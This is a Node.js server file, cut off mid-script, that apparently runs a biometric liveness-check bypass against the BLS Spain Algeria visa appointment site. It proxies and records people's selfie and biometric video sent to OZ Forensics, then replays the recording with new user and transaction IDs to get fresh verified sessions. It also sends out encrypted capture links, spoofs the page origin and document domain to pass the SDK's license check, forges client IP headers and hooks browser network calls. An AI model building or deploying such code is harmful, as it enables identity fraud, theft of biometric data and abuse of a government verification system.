/**
 * DZ34SNI Server v4.1 — PRE-SELFIE LINKS + INSTANT REPLAY
 * Deploy on Render: https://dz34sni-serveravecip-1.onrender.com
 * 
 * NEW FEATURES:
 * ═══════════════════════════════════════════════════════════
 * PRE-SELFIE SYSTEM:
 *   1. /pre-selfie?label=Ahmed → Real OZ selfie page
 *   2. During selfie, proxy CAPTURES all video/biometric data sent to OZ
 *   3. Data saved in memory under "Ahmed"
 *   4. Later, when Agent sends task → server REPLAYS the saved selfie
 *      with NEW userId + transactionId + IP → gets fresh event_session_id
 *   5. Result auto-sent back to Agent → NO phone needed!
 *
 * FLOW (Normal):
 *   Agent → POST /task/:phone → Phone polls → does selfie → result
 *
 * FLOW (Instant with pre-selfie):
 *   Agent → POST /task/:phone → Server detects pre-selfie for phone
 *   → Server replays OZ API calls with new params → gets session_id
 *   → Result auto-available for Agent → INSTANT!
 *
 * ENDPOINTS:
 *   GET  /dashboard          → Manage pre-selfies
 *   GET  /pre-selfie         → Do a pre-selfie (captures OZ data)
 *   POST /api/preselfie      → Save captured data from pre-selfie page
 *   GET  /api/preselfies     → List all saved pre-selfies
 *   DEL  /api/preselfie/:id  → Delete a pre-selfie
 *   POST /api/replay/:id     → Manually replay a pre-selfie
 * ═══════════════════════════════════════════════════════════
 */

const express = require('express');
const cors = require('cors');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto');
const LINK_SECRET = process.env.LINK_SECRET || 'DZ34SNI_S3CR3T_K3Y_2024_AYOUDZ!';
const LINK_ALGO = 'aes-256-cbc';
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());

app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    const p = req.path.length > 80 ? req.path.substring(0, 80) + '...' : req.path;
    console.log(`[${ts}] ${req.method} ${p}`);
    next();
});

app.use('/task', express.json({ limit: '1mb' }));
app.use('/result', express.json({ limit: '1mb' }));
app.use('/api', express.json({ limit: '50mb' })); // Larger for video data

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};
const phoneIpMap = {};

// ★ PRE-SELFIE STORAGE ★
// Key: preselfie ID → { label, phone, captures[], createdAt, status }
const preSelfies = {};

// Phone → preselfie ID mapping (which preselfie to use for which phone)
const phonePreselfieMap = {};

// Capture buffer during pre-selfie (temp storage while selfie in progress)
// Key: captureSession → { requests[], responses[] }
const captureBuffers = {};
const generatedLinks = {};

// Cleanup every 5 minutes
setInterval(() => {
    const now = Date.now();
    const MAX_TASK = 30 * 60 * 1000;
    const MAX_PRESELFIE = 7 * 24 * 60 * 60 * 1000; // 7 days
    for (const p in tasks) {
        if (now - (tasks[p].timestamp || 0) > MAX_TASK) { delete tasks[p]; delete phoneIpMap[p]; }
    }
    for (const p in results) {
        if (now - (results[p].timestamp || 0) > MAX_TASK) { delete results[p]; }
    }
    for (const id in preSelfies) {
        if (now - (preSelfies[id].createdAt || 0) > MAX_PRESELFIE) {
            // Remove phone mapping
            for (const ph in phonePreselfieMap) {
                if (phonePreselfieMap[ph] === id) delete phonePreselfieMap[ph];
            }
            delete preSelfies[id];
            console.log(`[CLEANUP] Pre-selfie expired: ${id}`);
        }
    }
    for (const cs in captureBuffers) {
        if (now - (captureBuffers[cs].createdAt || 0) > MAX_TASK) { delete captureBuffers[cs]; }
    }
    for (const lid in generatedLinks) {
        if (now - (generatedLinks[lid].createdAt || 0) > 7*24*60*60*1000) { delete generatedLinks[lid]; }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// TASK ROUTES (modified for instant mode)
// ═══════════════════════════════════════════

app.post('/task/:phone', async (req, res) => {
    const phone = req.params.phone;
    const b = req.body || {};
    if (!b.userId || !b.transactionId) return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });

    tasks[phone] = {
        userId: b.userId, transactionId: b.transactionId,
        realIp: b.realIp || '', cookies: b.cookies || '',
        userAgent: b.userAgent || '', pageUrl: b.pageUrl || '',
        verificationToken: b.verificationToken || '',
        timestamp: b.timestamp || Date.now()
    };
    if (b.realIp) phoneIpMap[phone] = b.realIp;

    console.log(`[TASK] 📥 ${phone}: userId=${b.userId.substring(0, 20)}... realIp=${b.realIp || 'none'}`);

    // ★ CHECK FOR PRE-SELFIE → INSTANT REPLAY ★
    const preselfieId = phonePreselfieMap[phone];
    if (preselfieId && preSelfies[preselfieId] && preSelfies[preselfieId].status === 'ready') {
        console.log(`[INSTANT] ⚡ Pre-selfie found for ${phone}: ${preselfieId} (${preSelfies[preselfieId].label})`);
        
        // Launch replay in background (don't block response)
        replayPreselfie(preselfieId, b.userId, b.transactionId, b.realIp || '', phone)
            .then(sessionId => {
                if (sessionId) {
                    results[phone] = {
                        event_session_id: sessionId,
                        status: 'completed',
                        realIp: b.realIp || phoneIpMap[phone] || '',
                        timestamp: Date.now(),
                        instant: true,
                        preselfieId: preselfieId
                    };
                    delete tasks[phone];
                    console.log(`[INSTANT] ✅ ${phone}: session=${sessionId.substring(0, 20)}... (from pre-selfie "${preSelfies[preselfieId].label}")`);
                } else {
                    console.error(`[INSTANT] ❌ Replay failed for ${phone}`);
                }
            })
            .catch(err => {
                console.error(`[INSTANT] ❌ Replay error for ${phone}:`, err.message);
            });

        res.json({ ok: true, instant: true, preselfieLabel: preSelfies[preselfieId].label });
    } else {
        res.json({ ok: true, instant: false });
    }
});

app.get('/task/:phone', (req, res) => {
    const t = tasks[req.params.phone];
    if (t) {
        console.log(`[TASK] 📤 ${req.params.phone}: sending`);
        res.json({ ok: true, task: t });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// RESULT ROUTES
// ═══════════════════════════════════════════

app.post('/result/:phone', (req, res) => {
    const phone = req.params.phone;
    const b = req.body || {};
    if (!b.event_session_id) return res.status(400).json({ ok: false, error: 'Missing event_session_id' });

    results[phone] = {
        event_session_id: b.event_session_id,
        status: b.status || 'completed',
        realIp: b.realIp || phoneIpMap[phone] || '',
        timestamp: b.timestamp || Date.now()
    };
    delete tasks[phone];

    console.log(`[RESULT] ✅ ${phone}: session=${b.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:phone', (req, res) => {
    const r = results[req.params.phone];
    res.json(r ? { ok: true, result: r } : { ok: false, result: null });
});

// ═══════════════════════════════════════════
// CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:phone', (req, res) => {
    const p = req.params.phone;
    delete tasks[p]; delete results[p]; delete phoneIpMap[p];
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ PROXY — WITH CAPTURE MODE FOR PRE-SELFIE
// ═══════════════════════════════════════════

app.options('/oz-proxy/*', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(204).end();
});

app.all('/oz-proxy/:phone/*', (req, res) => {
    const phone = req.params.phone;
    const agentIp = phoneIpMap[phone] || '';
    const targetPath = req.params[0] || '';

    if (!targetPath) return res.status(400).json({ error: 'Missing target' });

    const targetUrl = 'https://' + targetPath + (req._parsedUrl.search || '');

    let parsedUrl;
    try { parsedUrl = new URL(targetUrl); } catch(e) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    if (!parsedUrl.hostname.includes('ozforensics.com')) {
        return res.status(403).json({ error: 'Forbidden domain' });
    }

    const fullPath = parsedUrl.pathname + parsedUrl.search;
    console.log(`[PROXY] ${req.method} → ${parsedUrl.hostname}${parsedUrl.pathname.substring(0, 50)} (IP: ${agentIp || 'none'})`);

    // ★ CAPTURE MODE: if phone starts with "preselfie_", save all requests ★
    const isCapture = phone.startsWith('preselfie_');
    const captureId = isCapture ? phone : null;

    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const bodyBuf = chunks.length > 0 ? Buffer.concat(chunks) : null;

        const h = {
            'Host': parsedUrl.hostname,
            'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Origin': 'https://algeria.blsspainglobal.com',
            'Referer': 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest'
        };

        ['accept', 'accept-language', 'content-type'].forEach(k => {
            if (req.headers[k]) h[k] = req.headers[k];
        });

        if (agentIp) {
            h['X-Forwarded-For'] = agentIp;
            h['X-Real-IP'] = agentIp;
        }

        if (bodyBuf) h['Content-Length'] = bodyBuf.length;

        const opts = {
            hostname: parsedUrl.hostname,
            port: 443,
            path: fullPath,
            method: req.method,
            headers: h,
            timeout: 60000
        };

        const proxyReq = https.request(opts, (proxyRes) => {
            const skip = ['transfer-encoding', 'content-encoding', 'connection', 'keep-alive'];
            for (const [k, v] of Object.entries(proxyRes.headers)) {
                if (!skip.includes(k.toLowerCase())) {
                    if (k.toLowerCase() === 'access-control-allow-origin') {
                        res.setHeader(k, '*');
                    } else {
                        try { res.setHeader(k, v); } catch(e) {}
                    }
                }
            }

            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', '*');

            // ★ CAPTURE: Save response body ★
            if (isCapture && captureId && req.method === 'POST') {
                const resChunks = [];
                proxyRes.on('data', c => resChunks.push(c));
                proxyRes.on('end', () => {
                    const resBuf = Buffer.concat(resChunks);
                    
                    if (!captureBuffers[captureId]) {
                        captureBuffers[captureId] = { requests: [], createdAt: Date.now() };
                    }
                    
                    captureBuffers[captureId].requests.push({
                        method: req.method,
                        hostname: parsedUrl.hostname,
                        path: fullPath,
                        contentType: req.headers['content-type'] || '',
                        requestBody: bodyBuf ? bodyBuf.toString('base64') : null,
                        responseStatus: proxyRes.statusCode,
                        responseBody: resBuf.toString('base64'),
                        responseContentType: proxyRes.headers['content-type'] || '',
                        timestamp: Date.now()
                    });

                    console.log(`[CAPTURE] 📸 ${captureId}: ${req.method} ${parsedUrl.pathname.substring(0, 40)} (${resBuf.length} bytes) — total: ${captureBuffers[captureId].requests.length} requests`);

                    // Send response to client
                    res.status(proxyRes.statusCode);
                    res.end(resBuf);
                });
            } else {
                res.status(proxyRes.statusCode);
                proxyRes.pipe(res);
            }
        });

        proxyReq.on('error', (err) => {
            console.error(`[PROXY] ERR: ${err.message}`);
            if (!res.headersSent) res.status(502).json({ error: err.message });
        });

        proxyReq.on('timeout', () => {
            proxyReq.destroy();
            if (!res.headersSent) res.status(504).json({ error: 'Timeout' });
        });

        if (bodyBuf) proxyReq.write(bodyBuf);
        proxyReq.end();
    });
});

// ═══════════════════════════════════════════════════
// ★ PRE-SELFIE API ★
// ═══════════════════════════════════════════════════

// Save pre-selfie data (called from pre-selfie page after selfie completes)
app.post('/api/preselfie/save', (req, res) => {
    const { captureSession, label, phone, sessionId, linkId } = req.body || {};
    
    if (!captureSession || !label) {
        return res.status(400).json({ ok: false, error: 'Missing captureSession or label' });
    }

    const captured = captureBuffers[captureSession];
    if (!captured || !captured.requests || captured.requests.length === 0) {
        return res.status(400).json({ ok: false, error: 'No captured data found for this session' });
    }

    const id = 'ps_' + crypto.randomBytes(6).toString('hex');
    
    preSelfies[id] = {
        id,
        label: label.trim(),
        phone: (phone || '').trim(),
        sessionId: sessionId || '',
        captures: captured.requests,
        captureCount: captured.requests.length,
        createdAt: Date.now(),
        lastUsed: null,
        useCount: 0,
        status: 'ready'
    };

    // Auto-map phone if provided
    if (phone) {
        phonePreselfieMap[phone.trim()] = id;
    }

    // Clean up capture buffer
    if (linkId && generatedLinks[linkId]) { generatedLinks[linkId].completed = true; generatedLinks[linkId].preselfieId = id; }

    if (linkId && generatedLinks[linkId]) { generatedLinks[linkId].completed = true; generatedLinks[linkId].preselfieId = id; }
    delete captureBuffers[captureSession];

    console.log(`[PRE-SELFIE] 💾 Saved: "${label}" (${id}) — ${captured.requests.length} captured requests — phone: ${phone || 'none'}`);
    res.json({ ok: true, id, captureCount: captured.requests.length });
});

// List all pre-selfies
app.get('/api/preselfies', (req, res) => {
    const list = Object.values(preSelfies).map(ps => ({
        id: ps.id,
        label: ps.label,
        phone: ps.phone,
        captureCount: ps.captureCount,
        createdAt: ps.createdAt,
        lastUsed: ps.lastUsed,
        useCount: ps.useCount,
        status: ps.status,
        age: Math.floor((Date.now() - ps.createdAt) / 1000) + 's'
    }));
    res.json({ ok: true, preselfies: list, mappings: phonePreselfieMap });
});

// Assign a pre-selfie to a phone number
app.post('/api/preselfie/assign', (req, res) => {
    const { id, phone } = req.body || {};
    if (!id || !phone) return res.status(400).json({ ok: false, error: 'Missing id or phone' });
    if (!preSelfies[id]) return res.status(404).json({ ok: false, error: 'Pre-selfie not found' });

    phonePreselfieMap[phone.trim()] = id;
    preSelfies[id].phone = phone.trim();
    console.log(`[PRE-SELFIE] 🔗 Assigned "${preSelfies[id].label}" to phone: ${phone}`);
    res.json({ ok: true });
});

// Unassign phone
app.post('/api/preselfie/unassign', (req, res) => {
    const { phone } = req.body || {};
    if (!phone) return res.status(400).json({ ok: false, error: 'Missing phone' });
    delete phonePreselfieMap[phone.trim()];
    res.json({ ok: true });
});

// Delete a pre-selfie
app.delete('/api/preselfie/:id', (req, res) => {
    const id = req.params.id;
    if (!preSelfies[id]) return res.status(404).json({ ok: false, error: 'Not found' });

    // Remove phone mappings
    for (const ph in phonePreselfieMap) {
        if (phonePreselfieMap[ph] === id) delete phonePreselfieMap[ph];
    }
    delete preSelfies[id];
    console.log(`[PRE-SELFIE] 🗑️ Deleted: ${id}`);
    res.json({ ok: true });
});

// Manual replay test
app.post('/api/replay/:id', async (req, res) => {
    const id = req.params.id;
    const { userId, transactionId, realIp, phone } = req.body || {};
    
    if (!preSelfies[id]) return res.status(404).json({ ok: false, error: 'Pre-selfie not found' });
    if (!userId || !transactionId) return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });

    try {
        const sessionId = await replayPreselfie(id, userId, transactionId, realIp || '', phone || '');
        if (sessionId) {
            res.json({ ok: true, event_session_id: sessionId });
        } else {
            res.json({ ok: false, error: 'Replay failed — no session ID returned' });
        }
    } catch(err) {
        res.status(500).json({ ok: false, error: err.message });
    }
});

// ═══════════════════════════════════════════════════
// ★ REPLAY ENGINE ★
// ═══════════════════════════════════════════════════

/**
 * Replay a pre-selfie: send the captured OZ API requests
 * with NEW userId + transactionId + IP
 * Returns: new event_session_id
 */
async function replayPreselfie(preselfieId, newUserId, newTransactionId, newIp, phone) {
    const ps = preSelfies[preselfieId];
    if (!ps || !ps.captures || ps.captures.length === 0) {
        throw new Error('No capture data');
    }

    console.log(`[REPLAY] ▶ Starting replay "${ps.label}" for userId=${newUserId.substring(0, 15)}... IP=${newIp}`);

    let lastSessionId = null;

    for (let i = 0; i < ps.captures.length; i++) {
        const cap = ps.captures[i];
        
        // Skip GET requests and non-API calls (SDK assets, etc.)
        if (cap.method !== 'POST') continue;

        try {
            // Rebuild request body, replacing old meta with new
            let bodyBuf = cap.requestBody ? Buffer.from(cap.requestBody, 'base64') : null;
            
            if (bodyBuf && cap.contentType && cap.contentType.includes('json')) {
                try {
                    let bodyObj = JSON.parse(bodyBuf.toString());
                    // Replace meta fields
                    if (bodyObj.meta) {
                        if (bodyObj.meta.user_id) bodyObj.meta.user_id = newUserId;
                        if (bodyObj.meta.transaction_id) bodyObj.meta.transaction_id = newTransactionId;
                    }
                    if (bodyObj.user_id) bodyObj.user_id = newUserId;
                    if (bodyObj.transaction_id) bodyObj.transaction_id = newTransactionId;
                    bodyBuf = Buffer.from(JSON.stringify(bodyObj));
                } catch(e) {
                    // Not valid JSON or different structure, send as-is
                }
            }

            // If multipart form data, try to replace meta fields in the text parts
            if (bodyBuf && cap.contentType && cap.contentType.includes('multipart')) {
                let bodyStr = bodyBuf.toString('latin1');
                // Replace user_id and transaction_id in multipart text parts
                // These are typically in form fields within the multipart body
                bodyStr = bodyStr.replace(/(user_id["']?\s*[:=]\s*["']?)[^"'\r\n&}]+/gi, '$1' + newUserId);
                bodyStr = bodyStr.replace(/(transaction_id["']?\s*[:=]\s*["']?)[^"'\r\n&}]+/gi, '$1' + newTransactionId);
                bodyBuf = Buffer.from(bodyStr, 'latin1');
            }

            // Build headers
            const h = {
                'Host': cap.hostname,
                'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
                'Origin': 'https://algeria.blsspainglobal.com',
                'Referer': 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest'
            };

            if (cap.contentType) h['Content-Type'] = cap.contentType;
            if (newIp) {
                h['X-Forwarded-For'] = newIp;
                h['X-Real-IP'] = newIp;
            }
            if (bodyBuf) h['Content-Length'] = bodyBuf.length;

            // Send request
            const result = await proxyRequest({
                hostname: cap.hostname,
                path: cap.path,
                method: cap.method,
                headers: h,
                body: bodyBuf
            });

            console.log(`[REPLAY] ${i + 1}/${ps.captures.length}: ${cap.method} ${cap.path.substring(0, 40)} → ${result.status}`);

            // Try to extract event_session_id from response
            if (result.body) {
                try {
                    const resObj = JSON.parse(result.body.toString());
                    if (resObj.event_session_id) {
                        lastSessionId = resObj.event_session_id;
                        console.log(`[REPLAY] 🎯 Got session: ${lastSessionId.substring(0, 20)}...`);
                    }
                    if (resObj.session_id && !lastSessionId) {
                        lastSessionId = resObj.session_id;
                    }
                    if (resObj.data && resObj.data.event_session_id) {
                        lastSessionId = resObj.data.event_session_id;
                    }
                } catch(e) {
                    // Binary response, check string
                    const bodyStr = result.body.toString();
                    const match = bodyStr.match(/"event_session_id"\s*:\s*"([^"]+)"/);
                    if (match) lastSessionId = match[1];
                }
            }

            // Small delay between requests to be realistic
            await new Promise(r => setTimeout(r, 200));
            
        } catch(err) {
            console.error(`[REPLAY] ⚠️ Request ${i + 1} failed:`, err.message);
            // Continue with next request
        }
    }

    // Update stats
    ps.lastUsed = Date.now();
    ps.useCount = (ps.useCount || 0) + 1;

    if (lastSessionId) {
        console.log(`[REPLAY] ✅ Complete! session=${lastSessionId.substring(0, 25)}...`);
    } else {
        console.log(`[REPLAY] ⚠️ Complete but no session_id found`);
    }

    return lastSessionId;
}

/**
 * Helper: Make an HTTPS request and return the response
 */
function proxyRequest({ hostname, path, method, headers, body }) {
    return new Promise((resolve, reject) => {
        const opts = { hostname, port: 443, path, method, headers, timeout: 30000 };
        
        const req = https.request(opts, (res) => {
            const chunks = [];
            res.on('data', c => chunks.push(c));
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: Buffer.concat(chunks)
                });
            });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        
        if (body) req.write(body);
        req.end();
    });
}

// ═══════════════════════════════════════════════════
// ═══════════════════════════════════════════════════
// ★ ENCRYPTION + LINK GENERATION ★
// ═══════════════════════════════════════════════════

function encryptData(data) {
    const key = crypto.scryptSync(LINK_SECRET, 'dz34sni_salt', 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(LINK_ALGO, key, iv);
    let enc = cipher.update(JSON.stringify(data), 'utf8', 'base64');
    enc += cipher.final('base64');
    return iv.toString('base64') + '.' + enc;
}

function decryptData(token) {
    try {
        const key = crypto.scryptSync(LINK_SECRET, 'dz34sni_salt', 32);
        const parts = token.split('.');
        if (parts.length !== 2) return null;
        const decipher = crypto.createDecipheriv(LINK_ALGO, key, Buffer.from(parts[0], 'base64'));
        let dec = decipher.update(parts[1], 'base64', 'utf8');
        dec += decipher.final('utf8');
        return JSON.parse(dec);
    } catch(e) { return null; }
}

function errorPage(title, sub) {
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Erreur</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f172a;font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center;padding:20px}.card{background:#1e293b;border-radius:16px;padding:40px 30px;border:1px solid #334155;max-width:400px}h1{font-size:20px;color:#f87171;margin-bottom:10px}p{font-size:14px;color:#94a3b8}</style></head><body><div class="card"><div style="font-size:50px;margin-bottom:16px">&#x274C;</div><h1>${title}</h1><p>${sub}</p></div></body></html>`;
}

function alreadyDonePage(label) {
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OK</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#059669,#0d9488);font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center;padding:20px}.card{background:rgba(255,255,255,.12);border-radius:16px;padding:40px 30px;border:1px solid rgba(255,255,255,.2);max-width:400px}h1{font-size:20px;margin-bottom:10px}p{font-size:14px;color:rgba(255,255,255,.8)}</style></head><body><div class="card"><div style="font-size:50px;margin-bottom:16px">&#x2705;</div><h1>Selfie deja enregistre</h1><p>"${label}" - Verification effectuee.</p></div></body></html>`;
}

app.post('/api/generate-link', (req, res) => {
    const { label, phone } = req.body || {};
    if (!label) return res.status(400).json({ ok: false, error: 'Missing label' });
    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
    const linkId = 'lnk_' + crypto.randomBytes(6).toString('hex');
    const captureSession = 'preselfie_' + crypto.randomBytes(8).toString('hex');
    const payload = { id: linkId, cs: captureSession, label: label.trim(), phone: (phone || '').trim(), ts: Date.now(), exp: Date.now() + 7*24*60*60*1000 };
    const token = encryptData(payload);
    const encodedToken = encodeURIComponent(token);
    const link = `${serverUrl}/s?d=${encodedToken}`;
    generatedLinks[linkId] = { id: linkId, label: label.trim(), phone: (phone || '').trim(), captureSession, link, used: false, completed: false, preselfieId: null, createdAt: Date.now() };
    console.log(`[LINK] Generated for "${label}": ${linkId}`);
    res.json({ ok: true, linkId, link, token: encodedToken });
});

app.get('/api/links', (req, res) => {
    const list = Object.values(generatedLinks).map(l => ({ id: l.id, label: l.label, phone: l.phone, link: l.link, used: l.used, completed: l.completed, createdAt: l.createdAt }));
    res.json({ ok: true, links: list });
});

app.delete('/api/link/:id', (req, res) => { delete generatedLinks[req.params.id]; res.json({ ok: true }); });

app.get('/s', (req, res) => {
    const token = req.query.d;
    if (!token) return res.status(400).send(errorPage('Lien invalide', 'Token manquant'));
    const data = decryptData(decodeURIComponent(token));
    if (!data) return res.status(400).send(errorPage('Lien invalide', 'Token corrompu'));
    if (data.exp && Date.now() > data.exp) return res.status(410).send(errorPage('Lien expire', 'Ce lien a expire.'));
    const linkInfo = generatedLinks[data.id];
    if (linkInfo && linkInfo.completed) return res.send(alreadyDonePage(data.label));
    if (linkInfo) linkInfo.used = true;
    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
    const url = `${serverUrl}/pre-selfie?label=${encodeURIComponent(data.label)}&phone=${encodeURIComponent(data.phone || '')}&cs=${encodeURIComponent(data.cs)}&linkId=${encodeURIComponent(data.id)}`;
    res.redirect(302, url);
});


// ★ PRE-SELFIE PAGE ★
// ═══════════════════════════════════════════════════

app.get('/pre-selfie', (req, res) => {
    const { label, phone, realIp } = req.query;
    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
    
    // Generate unique capture session ID
    const captureSession = req.query.cs || ('preselfie_' + crypto.randomBytes(8).toString('hex'));
    const linkId = req.query.linkId || '';
    
    const esc = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const safeLabel = esc(label || 'Unknown');
    const safePhone = esc(phone || '');
    const safeIp = esc(realIp || '');

    // Temp userId/transactionId for pre-selfie
    const tempUserId = 'preselfie-' + crypto.randomBytes(16).toString('hex');
    const tempTransactionId = 'preselfie-' + crypto.randomBytes(16).toString('hex');

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>DZ34SNI — Pre-Selfie</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh;color:#f1f5f9}
.header{background:linear-gradient(135deg,#dc2626,#b91c1c);padding:16px 20px;text-align:center}
.header h1{font-size:20px;font-weight:900;color:#fff}
.header p{font-size:12px;color:rgba(255,255,255,.7);margin-top:4px}
.info{padding:16px;background:#1e293b;margin:12px;border-radius:12px;border:1px solid #334155}
.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
.info-row .lbl{color:#94a3b8}
.info-row .val{color:#f1f5f9;font-weight:700}
#st{text-align:center;padding:12px;font-size:14px;font-weight:700;color:#0d9488}
.ld{position:fixed;inset:0;z-index:9999;background:#0f172a;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
.ld .logo{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#b91c1c);display:flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 8px 32px rgba(220,38,38,.4)}
.ld .logo span{font-size:38px;font-weight:900}
.ld h2{font-size:18px;font-weight:700;margin-bottom:8px}
.ld p{font-size:12px;color:#94a3b8}
.ld-spin{width:40px;height:40px;border:4px solid rgba(255,255,255,.1);border-top-color:#dc2626;border-radius:50%;animation:sp .8s linear infinite;margin-top:20px}
@keyframes sp{to{transform:rotate(360deg)}}
#ok-screen{position:fixed;inset:0;z-index:2147483647;display:none;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#059669,#0d9488);text-align:center;padding:30px}
.chk{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin-bottom:20px;animation:pop .5s ease-out}
@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
.ozliveness_logo,.ozliveness_version{display:none!important}
</style>
</head>
<body>

<div class="ld" id="ld">
    <div class="logo"><span>D</span></div>
    <h2>PRE-SELFIE</h2>
    <p>Préparation de la capture...</p>
    <p style="margin-top:8px;font-size:11px;color:#dc2626">MODE CAPTURE — ${safeLabel}</p>
    <div class="ld-spin"></div>
</div>

<div class="header">
    <h1>🐉 DZ34SNI — PRE-SELFIE</h1>
    <p>Capture biométrique pour: <b>${safeLabel}</b></p>
</div>

<div class="info">
    <div class="info-row"><span class="lbl">Personne</span><span class="val">${safeLabel}</span></div>
    <div class="info-row"><span class="lbl">Téléphone</span><span class="val">${safePhone || '—'}</span></div>
    <div class="info-row"><span class="lbl">Session</span><span class="val" style="font-size:10px">${captureSession.substring(0, 20)}...</span></div>
</div>

<div id="st">Initialisation proxy capture...</div>

<div id="ok-screen">
    <div class="chk"><span style="font-size:50px;color:#fff">&#10003;</span></div>
    <p style="font-size:28px;font-weight:900;color:#fff;margin-bottom:8px">PRE-SELFIE SAUVEGARDÉ !</p>
    <p style="font-size:16px;color:rgba(255,255,255,.8)" id="ok-detail"></p>
    <p style="font-size:14px;color:rgba(255,255,255,.6);margin-top:12px" id="ok-count"></p>
    <a href="/dashboard" style="display:inline-block;margin-top:20px;padding:12px 24px;background:rgba(255,255,255,.2);color:#fff;border-radius:10px;text-decoration:none;font-weight:700">← Dashboard</a>
</div>

<!-- CRITICAL: Spoof window.origin BEFORE SDK loads — OZ checks this for license -->
<script>
(function(){
    // Override window.origin to match BLS domain (license is bound to this origin)
    try {
        Object.defineProperty(window, 'origin', {
            value: 'https://algeria.blsspainglobal.com',
            writable: false,
            configurable: true
        });
    } catch(e) {}
    // Also override location.origin via a getter
    try {
        var _loc = window.location;
        Object.defineProperty(_loc, 'origin', {
            get: function() { return 'https://algeria.blsspainglobal.com'; },
            configurable: true
        });
    } catch(e) {}
    // Override document.location.origin
    try {
        Object.defineProperty(document, 'domain', {
            get: function() { return 'algeria.blsspainglobal.com'; },
            configurable: true
        });
    } catch(e) {}
    // Override self.origin
    try {
        Object.defineProperty(self, 'origin', {
            value: 'https://algeria.blsspainglobal.com',
            writable: false,
            configurable: true
        });
    } catch(e) {}
    console.log('[DZ34SNI] Origin spoofed to:', window.origin);
})();
</script>

<!-- URL spoof for OZ SDK -->
<script>try{history.replaceState({},'','/dza/appointment/LivenessRequest');}catch(e){}</script>

<!-- Intercept ozforensics → proxy with capture -->
<script>
(function(){
    var CS = '${captureSession}';
    var PB = '${serverUrl}/oz-proxy/' + encodeURIComponent(CS) + '/';

    function rw(url) {
        if (typeof url !== 'string') return url;
        var m = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
        return m ? PB + m[1] + m[2] : url;
    }

    var _f = window.fetch;
    window.fetch = function(i, o) {
        if (typeof i === 'string') i = rw(i);
        else if (i && i.url) { var u = rw(i.url); if (u !== i.url) i = new Request(u, i); }
        return _f.call(this, i, o);
    };

    var _xo = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, u) {
        arguments[1] = rw(u);
        return _xo.apply(this, arguments);
    };

    var _ce = document.createElement.bind(document);
    document.createElement = function(tag) {
        var el = _ce(tag);
        if (tag.toLowerCase() === 'script') {
            var d = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
            if (d && d.set) {
                Object.defineProperty(el, 'src', {
                    set: function(v) { d.set.call(this, rw(v)); },
                    get: function() { return d.get.call(this); },
                    configurable: true
                });
            }
        }
        if (tag.toLowerCase() === 'link') {
            var d2 = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
            if (d2 && d2.set) {
